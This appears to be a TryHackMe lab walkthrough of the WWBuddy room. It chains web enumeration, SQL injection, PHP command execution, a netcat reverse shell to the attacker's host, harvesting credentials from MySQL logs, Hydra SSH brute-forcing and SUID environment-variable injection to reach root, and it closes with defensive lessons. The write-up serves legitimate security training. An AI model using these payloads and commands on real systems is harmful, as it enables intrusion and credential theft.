# TryHackMe: WWBuddy — Penetration Testing & Walkthrough Report

[![Target: TryHackMe](https://img.shields.io/badge/Platform-TryHackMe-red?style=for-the-badge&logo=tryhackme&logoColor=white)](https://tryhackme.com)
[![Target OS: Linux](https://img.shields.io/badge/OS-Linux%20(Ubuntu%2018.04)-FCC624?style=for-the-badge&logo=linux&logoColor=black)](#)
[![Difficulty: Medium](https://img.shields.io/badge/Difficulty-Medium-orange?style=for-the-badge)](#)
[![Category: VAPT / Red Team](https://img.shields.io/badge/Category-VAPT%20%2F%20Adversary%20Simulation-blueviolet?style=for-the-badge)](#)

---
## Introduction
WwBuddy is a TryHackMe room that provides a practical introduction to web enumeration, SQL injection, authenticated command execution, Linux credential discovery, SSH brute-forcing, and privilege escalation through a vulnerable SUID binary.

The machine demonstrates an important penetration-testing workflow:
------
Enumerate → Identify an entry point → Exploit the application → Obtain a shell → Enumerate locally → Pivot to another user → Escalate privileges → Capture the flags

This walkthrough explains not only the commands used to compromise the machine, but also the reasoning behind each step.

### Lab information
```text
Target IP: TARGET_IP
Kali Linux IP: XXX.XXX.XXX.XXX
Tun0 IP: XXX.XXX.XXX.XXX
Operating System: Ubuntu Linux
Attack environment: Kali Linux
Room: WwBuddy — TryHackMe
```

### 1. Initial Enumeration
The first step in any penetration test is to understand what services are exposed by the target.

A basic Nmap scan reveals two interesting TCP ports:
```text
22/tcp   open  ssh    OpenSSH 7.6p1 Ubuntu 4ubuntu0.3
80/tcp   open  http   Apache httpd 2.4.29 (Ubuntu)
```

The important takeaway is that the machine exposes:

1. SSH on port 22, which may provide remote shell access if valid credentials are discovered.
2. HTTP on port 80, which is likely to be the primary attack surface.

Because a web server is available, the next step is to enumerate the web application.

### 2. Web Enumeration
Browsing to:
```text
http://TARGET_IP
```
reveals a web application.

Rather than relying exclusively on what is visible from the homepage, we should enumerate directories and files that may not be linked publicly.

### Directory Enumeration with Gobuster
Gobuster can be used to discover hidden directories and endpoints:
```bash
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt
```

The scan revealed several interesting endpoints:
```text
/admin
/api
/change
/images
/login
/js
/profile
/register
/server-status
/styles
```

There are several particularly interesting locations here:
Endpoint	Why it matters
/admin	Potential administrative functionality
/api	Possible backend/API functionality
/change	Could contain account-management functionality
/login	Authentication mechanism
/profile	Authenticated user functionality
/register	Potentially allows account creation
/server-status	Apache status information, although access is forbidden


The ***/register*** endpoint is particularly useful because it means we can create an account and investigate the application from an authenticated perspective.


### 3. Creating an Application Account
Visiting the available endpoints showed that registration was possible.

I created a test account:
```text
Username: test
Password: pass123
```
After registration, I logged into the application.

The authenticated portion of the application exposed functionality for updating user information, including the account password.

This is an important point during web application testing:

> [!NOTE]
Features that modify user-controlled data should always be tested carefully because they frequently interact with backend database queries.

The password-change/update functionality therefore became the next area of investigation.


### 4. Testing the Profile Update Functionality
After logging in, I modified the profile information and observed how the application processed the request.

The next logical test was to determine whether the username and password fields were safely handled by the backend.

One of the SQL injection payloads tested was:
```bash
' OR 1=1 -- -
```
The important part of this payload is:
```text
OR 1=1
```
Because **1=1** is always true, it can alter the logic of an improperly constructed SQL query.

The trailing comment:
```text
-- -
```
is used to comment out the remainder of the SQL statement.

For example, if an application were vulnerable to a query resembling:
```text
SELECT * FROM users
WHERE username='$username'
AND password='$password';
```
injecting SQL syntax into one of the parameters could change the logical structure of the query.
> [!NOTE]
Important: In a real penetration test, the exact request, parameter, and resulting SQL behavior should be documented rather than assuming that a particular payload will work universally.

### 5. SQL Injection → Authentication Bypass
The vulnerable update functionality allowed the SQL injection to affect authentication-related data.

Using the injection:
```bash
' OR 1=1 -- -
```
against the vulnerable field demonstrated that the application was not properly parameterizing database queries.

The practical consequence was an authentication bypass.

The application could be tricked into accepting the injected value as part of the authentication process rather than treating it as ordinary user input.

This is a major finding:

----
SQL Injection ──► Authentication Bypass

----

At this point, the application should be considered compromised from a web-application perspective.

### 6. Investigating the Administrative Area
After obtaining authenticated access, the /admin endpoint became particularly interesting.

Further investigation revealed that the administrative functionality processed a command parameter.

The vulnerable functionality effectively contained code equivalent to:
```bash
<?php system($_GET['cmd']); ?>
```
This is extremely dangerous.

The PHP **system()** function executes an operating-system command. Combining it with a user-controlled GET parameter means an attacker can potentially execute arbitrary commands on the server.

For example:
```text
/admin/?cmd=id
```
could result in the server executing:
```text
id
```
This changes the attack from:
```text
SQL Injection
```
to:
```text
Remote Command Execution
```
The vulnerability chain is therefore:
```text
Web Enumeration
      ↓
Account Registration
      ↓
SQL Injection
      ↓
Authentication Bypass
      ↓
Admin Access
      ↓
Command Injection / RCE
      ↓
Reverse Shell
```

### 7. Obtaining a Reverse Shell
Once command execution was confirmed, the next objective was to obtain an interactive shell.

First, a listener can be started on the attacking machine:
```bash
nc -lvnp 4444
```
The reverse-shell command used in the lab was:
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc kali-ip 4444 >/tmp/f
```
The command creates a named pipe in **/tmp** and uses it to connect the target back to the attacker's Netcat listener.

It is important that the callback address is the IP address reachable from the target, rather than simply assuming that the Kali interface address is the correct one.

In this lab, the Tun0 address was:

XXX.XXX.XXX.XXX

The resulting request can be URL-encoded when passed through the vulnerable web endpoint.

For example, conceptually:
```text
http://TARGET_IP/admin/?cmd=<URL_ENCODED_COMMAND>
```
Once the target executes the command, the Netcat listener should receive a shell.

### 8. Stabilizing the Reverse Shell
The initial reverse shell is usually a basic /bin/sh session and lacks the functionality of a proper terminal.

A Python pseudo-terminal can be spawned:
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
Then press:
```bash
Ctrl+Z
```
On the Kali terminal, configure the local terminal:
```bash
stty raw -echo; fg
```
Then:
```bash
export TERM=xterm
```
The terminal size can also be configured:
```bash
stty rows 28 columns 135
```
Check the terminal settings with:
```bash
stty size
```
A stabilized terminal makes subsequent enumeration much easier because commands such as **su**, **clear**, text editors, and interactive programs behave more normally.

### 9. Local Enumeration — Investigating MySQL
With an interactive shell established, the next objective is to determine what information can be recovered from the compromised machine.

One particularly interesting directory was:
```bash
cd /var/log/mysql
```
Listing the directory revealed MySQL logs.

The general query log was particularly valuable:
```bash
cat general.log
```
Application and database logs can contain sensitive information such as:

1. Usernames
2. Authentication attempts
3. SQL queries
4. Application-generated requests
5. Passwords accidentally written to logs
In this case, the MySQL general log contained credentials for another user.

The discovered credentials were:
```text
Username: rxxx-xxxo
Password: XXX-XXX-XXX-XXX
```
This is an excellent example of why post-exploitation enumeration matters.

The initial shell did not immediately provide the privileges required to finish the machine, but sensitive credentials were exposed through local log files.

### 10. Pivoting to Rxxxxxo

Using the recovered credentials:
```bash
su rxxx-xxxo
```
Enter the discovered password when prompted.

We now have a shell as:
```text
rxxx-xxxo
```
This represents a privilege change and, more importantly, demonstrates a common real-world attack path:
```text
Compromise Application
        ↓
Obtain Low-Privilege Shell
        ↓
Search Local Files/Logs
        ↓
Recover Credentials
        ↓
Switch User
```
At this point, we should enumerate the new user's environment.

### 11. Discovering the Jenny Account
After moving around the /home directory:
```bash
cd /home
ls -la
```
another user was discovered:
```text
jx-xy
```
The next question was:

How can we obtain access to Jx-xy's account?

Rather than blindly guessing credentials, local privilege-enumeration tools can provide useful information about the machine's configuration.

### 12. Running LinPEAS
LinPEAS is a Linux privilege-escalation enumeration script that searches for common misconfigurations and potential escalation paths.

Because the target does not necessarily have Internet access, the script can be transferred from Kali.

On the Kali machine:
```bash
python3 -m http.server 9999
```
This starts a simple HTTP server in the directory containing linpeas.sh.

On the target:
```bash
wget http://kali-ip:9999/linpeas.sh
```
Make the script executable:
```bash
chmod +x linpeas.sh
```
Then run it:
```bash
./linpeas.sh
```
> [!NOTE]
Note: Replace XXX-XXX-XXX-XXX with the IP address that is actually reachable from the target in your lab environment.

### 13. Using LinPEAS Results
LinPEAS produces a large amount of information.

The most important skill here is not simply running the tool; it is understanding what the output means.

Among the highlighted findings were potential privilege-escalation opportunities involving:

1. SUID binaries
2. Writable files
3. Credentials
4. Services
5. Interesting users
6. Scheduled tasks
7. Misconfigured permissions
8. One particularly interesting binary was:

```bash
/bin/authenticate
```
It had the characteristics of a SUID executable and therefore deserved closer inspection.

### 14. Understanding SUID Privilege Escalation
SUID, or Set User ID, is a Linux permission mechanism that allows an executable to run with the privileges of its file owner.

For example, if a binary is:
```text
-rwsr-xr-x
```
the **s** indicates that the SUID bit is enabled.

If the binary is owned by root, a vulnerability in that binary may allow a low-privileged user to execute commands with root privileges.

This is why SUID binaries are important during Linux privilege escalation.

A useful enumeration command is:
```bash
find / -perm -4000 -type f 2>/dev/null
```
This searches for SUID files across the filesystem.

In this room, **/bin/authenticate** was the interesting binary.

### 15. Exploiting /bin/authenticate
Further investigation showed that the authentication binary could be abused through its handling of environment/user input.

The exploitation step used:
```bash
export USER=";bash"
/bin/authenticate
```
The vulnerable program processes the **USER** environment variable in an unsafe manner.

Because **/bin/authenticate** executes with elevated privileges, the injected command results in a shell running with those privileges.

If successful, checking the current identity:
```bash
whoami
```
should return:
```bash
root
```
We have now completed the privilege-escalation chain:
```text
www-data / initial shell
        ↓
rxxxxo
        ↓
jxxxy
        ↓
SUID vulnerability
        ↓
root
```

### 16. Capturing the Root Flag
Once the root shell has been obtained, move into the root user's home directory:
```bash
cd /root
ls -la
```
The root flag can then be read from the appropriate flag file:
```bash
cat root.txt
```
This completes the machine.

### 17. The Roberto User Flag and the importante.txt File
Before moving on to the final escalation, an important clue was discovered in Roberto's home directory.

Move into Rxxxxxo's home:
```bash
cd /home/rxxxxxo
ls -la
```
An interesting file was present:
```text
importante.txt
```
Read it:
```text
cat importante.txt
```
The contents provide an important clue for the next stage of the attack.

The file should not simply be treated as something to read and ignore. In CTF environments, files with names such as:
```text
important.txt
note.txt
todo.txt
backup.txt
password.txt
```
are often deliberately placed clues.

The information in importante.txt points toward a password-generation pattern involving dates.

This becomes particularly interesting when combined with the file's timestamps.

### 18. Examining File Metadata
The stat command can reveal useful metadata about a file:
```text
stat importante.txt
```
Among the information displayed was a timestamp around:
```text
Modify: 2020-07-27 21:25:48.544379536 +0000
Change: 2020-07-27 21:25:48.544379536 +0000
```
The timestamps themselves are not necessarily the password, but they provide useful contextual information.

The contents of the file and the date-related clue suggested that a password could be generated from a specific date range.

This leads to the next stage:
```
Generate a targeted wordlist instead of attempting a completely blind brute-force attack.
```

### 19. Generating a Date-Based Wordlist
Instead of manually creating thousands of possible dates, Python can be used to generate the wordlist automatically.

Create a Python file, for example:
```bash
nano generate_wordlist.py
```
Add:
```bash
from datetime import date, timedelta

start = date(1994, 1, 1)
end = date(1995, 7, 31)

with open("wordlist.txt", "w") as f:
    current = start

    while current <= end:
        f.write(current.strftime("%m/%d/%Y") + "\n")
        current += timedelta(days=1)

print("Created wordlist.txt successfully.")
```
Run it:
```bash
python3 generate_wordlist.py
```
This produces:
```text
wordlist.txt
```
containing dates in the format:
```text
01/01/1994
01/02/1994
01/03/1994
...
```
The reason this approach is effective is that the search space has been dramatically reduced.

Rather than guessing arbitrary passwords, we have converted a clue into a targeted list of candidates.

### 20. Brute-Forcing Jxxxxy's SSH Password
With a username and a targeted wordlist, SSH authentication can be tested.

The discovered username was:
```text
jxxxy
```
Hydra can be used against SSH:
```bash
hydra -l jxxxy -P wordlist.txt ssh://TARGET_IP -t 60
```
What the options mean
```text
-l jxxxy
```
Specifies the username.
```text
-P wordlist.txt
```
Specifies the password list.
```text
ssh://TARGET_IP
```
Specifies SSH as the target service.
```text
-t 60
```
Runs multiple concurrent tasks.

Eventually, Hydra identified the valid credentials:
```text
Username: jxxxy
Password: 0x/0x/1xx4
```
This demonstrates a useful penetration-testing principle:

Good enumeration reduces brute-force complexity.

The attack was successful not because thousands of random passwords were tried, but because information gathered from the target was used to construct a highly targeted wordlist.

### 21. SSH Access as Jenny
Connect to the machine over SSH:
```bash
ssh jxxxy@TARGET_IP
```
If SSH asks whether you trust the host key, verify the fingerprint when appropriate and accept it for the lab.

Enter the password discovered through the targeted wordlist:
```text
0x/0x/1xx4
```
You should now have an SSH shell as Jenny.

Confirm your identity:
```bash
whoami
```
Expected result:
```text
jxxxy
```
Again, stabilize the shell if necessary.

### 22. Repeating Local Enumeration
Privilege escalation should be treated as an iterative process.

Now that we are operating as Jxxxy, repeat the local enumeration process.

Transfer LinPEAS again if necessary:

On Kali:
```bash
python3 -m http.server 9999
```
On the target:
```bash
wget http://XXX-XXX-XXX-XXX:9999/linpeas.sh
```
Then:
```bash
chmod +x linpeas.sh
./linpeas.sh
```
Review the highlighted findings carefully.

At this stage, the important finding is the **SUID-enabled** authentication program:
```bash
/bin/authenticate
```
### 23. Final Privilege Escalation
The vulnerable SUID binary can be exploited through the USER environment variable.

Set the variable to contain the command injection:
```bash
export USER=";bash"
```
Then execute:
```bash
/bin/authenticate
```
If the vulnerability is successfully exploited, the resulting shell inherits the elevated privileges of the SUID program.

Verify:
```bash
whoami
```
The expected result is:
```bash
root
```
Congratulations — the machine has been fully compromised.

### 24. Retrieving the Root Flag
With root privileges:
```bash
cd /root
ls -la
```
Read the root flag:
```bash
cat root.txt
```
The root flag marks the completion of the WwBuddy room.

### 25. Complete Attack Chain
The entire compromise can be summarized as follows:

                    ┌─────────────────────┐
                    │   Target Web Server │
                    │       Port 80       │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Gobuster Enumeration│
                    │ /admin /change etc. │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Register an Account │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │   SQL Injection     │
                    │ ' OR 1=1 -- -       │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Authentication      │
                    │ Bypass              │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │      /admin         │
                    │ PHP system($_GET[]) │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Remote Command Exec │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │   Reverse Shell     │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ MySQL General Log   │
                    │ Rxxxxxxo Credentials │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │       Roberto       │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ importante.txt      │
                    │ Date-based clue     │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ Targeted Wordlist   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ SSH Brute Force     │
                    │      → Jxxxy        │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │   LinPEAS           │
                    │ SUID Discovery      │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │ /bin/authenticate   │
                    │ SUID Exploitation   │
                    └──────────┬──────────┘
                               │
                               ▼
                    ┌─────────────────────┐
                    │        ROOT         │
                    └─────────────────────┘

### 26. Key Lessons from the Room
WwBuddy is valuable because it demonstrates several vulnerabilities that frequently appear in real-world penetration tests.

### 26.1 Always Enumerate Before Exploiting
The initial Gobuster scan revealed endpoints that were not necessarily obvious from the homepage.

Directory enumeration can uncover:

1. Administrative interfaces
2. APIs
3. Authentication pages
4. Development files
5. Backup directories
6. Functionality that should not be publicly accessible
7. Enumeration provides the information needed to build an attack path.

### 26.2 User Input Must Never Be Trusted
The SQL injection vulnerability existed because user-supplied values were apparently incorporated into database queries without adequate protection.

Applications should use:

1. Prepared statements
2. Parameterized queries
3. Proper input validation
4. Secure database access libraries
5. SQL injection is preventable.

### 26.3 Never Expose OS Command Execution to Users
The equivalent of:
```text
system($_GET['cmd']);
```
is an extremely dangerous design.

If a web application genuinely needs to execute an operating-system operation, it should avoid passing arbitrary user input to a shell.

Better designs use:

1. Strict allowlists
2. Safe APIs
3. Fixed commands
4. Proper argument handling
5. Least-privilege service accounts

### 26.4 Logs Can Contain Secrets
The MySQL general log provided credentials for Roberto.

This is a powerful reminder that sensitive information can survive in unexpected locations.

During a penetration test, investigate:
```text
/var/log
```
as well as:

1. Application logs
2. Database logs
3. Backup files
4. Configuration files
5. Shell histories
6. Temporary files
7. Debug logs
8. Credentials should never be written to logs in plaintext.

### 26.5 Use Information to Reduce Brute-Force Space
The Jenny password was not discovered through completely random guessing.

Instead:

Application clue
       ↓
File contents
       ↓
Date information
       ↓
Targeted date range
       ↓
Custom wordlist
       ↓
SSH authentication testing

This is a much more intelligent approach than blindly attacking a service.

### 26.6 Always Investigate SUID Files
When operating as a low-privileged Linux user, SUID enumeration should be part of the standard checklist:
```text
find / -perm -4000 -type f 2>/dev/null
```
But finding a SUID binary does not automatically mean it is exploitable.

You still need to determine:

1. Who owns it?
2. What does it do?
3. What libraries does it use?
4. Does it execute external commands?
5. Does it trust environment variables?
6. Can it be influenced by unprivileged users?
7. Does it contain a known vulnerability?

In this room, /bin/authenticate was the key.

### 27. Vulnerability Chain
The most important part of this room is not any individual command. It is understanding how several weaknesses can be chained together.

The complete chain is:

1. Web enumeration
       ↓
2. Account registration
       ↓
3. SQL injection
       ↓
4. Authentication bypass
       ↓
5. Administrative access
       ↓
6. Command execution
       ↓
7. Reverse shell
       ↓
8. MySQL log enumeration
       ↓
9. Rxxxxo credentials
       ↓
10. User pivot
       ↓
11. File-based intelligence
       ↓
12. Targeted password wordlist
       ↓
13. SSH access as Jxxxxy
       ↓
14. Privilege enumeration
       ↓
15. Vulnerable SUID binary
       ↓
16. Environment-variable injection
       ↓
17. Root

This is the real lesson of the room:

A successful compromise is often not one vulnerability. It is a chain of individually small weaknesses that, when combined, result in complete system compromise.

### 28. Useful Commands Reference
For convenience, here are the major commands used throughout the room.

Directory Enumeration
```text
gobuster dir -u http://TARGET_IP/ -w /usr/share/wordlists/dirb/common.txt
```
Reverse Shell Listener
```text
nc -lvnp 4444
```
Shell Stabilization
```text
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```text
Ctrl+Z

stty raw -echo; fg
export TERM=xterm
```
```text
Inspect MySQL Logs
cd /var/log/mysql
cat general.log
```
```text
Switch User
su rxxxxxo
```

File Metadata
```text
stat importante.txt
```
Generate Wordlist
```text
python3 generate_wordlist.py
```

SSH Password Testing
```text
hydra -l jxxxy -P wordlist.txt ssh://TARGET_IP -t 60

Transfer LinPEAS
Kali:
```text
python3 -m http.server 9999
```
Target:
```text
wget http://192.168.132.136:9999/linpeas.sh
```
Execute LinPEAS
```text
chmod +x linpeas.sh
./linpeas.sh
```
Find SUID Binaries
```text
find / -perm -4000 -type f 2>/dev/null
```
Exploit the Vulnerable SUID Binary
```text
export USER=";bash"
/bin/authenticate
```
Confirm Privileges
```text
whoami
```
Retrieve Root Flag
```text
cd /root
cat root.txt
```
## Conclusion
The WwBuddy room provides an excellent example of how a penetration tester can progress from a publicly exposed web service to complete root-level compromise.

The attack began with simple enumeration and gradually developed into a multi-stage compromise involving:

Web directory enumeration
SQL injection
Authentication bypass
Remote command execution
Reverse-shell handling
Linux post-exploitation
Credential discovery through database logs
User pivoting
OSINT-style clue analysis
Targeted password generation
SSH authentication testing
SUID enumeration
Environment-variable injection
Linux privilege escalation
The most important takeaway is to think in attack chains rather than isolated vulnerabilities.
























